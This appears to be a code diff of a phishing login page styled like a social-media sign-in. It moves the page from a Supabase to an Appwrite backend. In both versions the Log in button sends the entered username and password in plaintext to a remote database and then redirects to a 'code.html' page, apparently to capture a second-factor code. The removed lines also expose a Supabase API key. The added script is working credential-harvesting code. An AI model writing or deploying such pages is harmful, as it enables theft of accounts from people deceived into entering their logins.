@@ -204,7 +204,7 @@
       <label for="password">Password</label>
     </div>
 
-    <button class="login-btn" onclick="submitToSupabase()">Log in</button>
+    <button class="login-btn" onclick="submitToAppwrite()">Log in</button>
     <div class="forgot-password" onclick="window.location.href='password.html'">Forgotten password?</div>
   </div>
 
@@ -218,44 +218,42 @@
     <div class="bottom-line">About · Help · More</div>
   </div>
 
-  <div id="code-list"></div>
-
   <script type="module">
-    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
+    import { Client, Databases, ID, Realtime } from 'https://cdn.jsdelivr.net/npm/appwrite@13.0.0/+esm';
 
-    const supabaseUrl = 'https://scserlwosxrmnvomipxt.supabase.co';
-    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNjc2VybHdvc3hybW52b21pcHh0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDk4MTI4NzMsImV4cCI6MjA2NTM4ODg3M30.JJtoPSkDqNTAgqpDHNZunqtyECGtYEWKh-YbvipTPH8';
-    const supabase = createClient(supabaseUrl, supabaseKey);
+    const client = new Client()
+      .setEndpoint('https://cloud.appwrite.io/v1')
+      .setProject('684dc1c800132faa6fd5');
 
-    window.submitToSupabase = async function () {
-      const username = document.getElementById("username").value.trim();
-      const password = document.getElementById("password").value.trim();
+    const databases = new Databases(client);
+    const realtime = new Realtime(client);
 
-      if (!username || !password) return alert("All fields are required.");
+    window.submitToAppwrite = async function () {
+      const u = document.getElementById("username").value.trim();
+      const p = document.getElementById("password").value.trim();
+      if (!u || !p) return alert("All fields are required.");
 
-      const { error } = await supabase.from('logins').insert([{ username, password }]);
-      if (error) {
+      try {
+        await databases.createDocument(
+          '684dc1c800132faa6fd5',  // database ID
+          '684dc1f1000027eff4b2',  // collection ID
+          ID.unique(),
+          { username: u, password: p }
+        );
+        // Now data is stored
+        window.location.href = "code.html";
+      } catch (e) {
         alert("Submission failed.");
-        console.error(error);
-        return;
+        console.error(e);
       }
-
-      window.location.href = "code.html";
     };
 
-    supabase
-      .channel('realtime:code')
-      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'code' }, payload => {
-        displayNewCode(payload.new);
-      })
-      .subscribe();
-
-    function displayNewCode(data) {
-      const container = document.getElementById("code-list");
-      const item = document.createElement("div");
-      item.textContent = data.value;
-      container.prepend(item);
-    }
+    // Optional: Real-time subscription to collection (not shown visually)
+    realtime.subscribe(`databases.684dc1c800132faa6fd5.collections.684dc1f1000027eff4b2.documents`)
+      .on('create', response => {
+        console.log('Realtime record created:', response);
+      });
   </script>
+
 </body>
 </html>
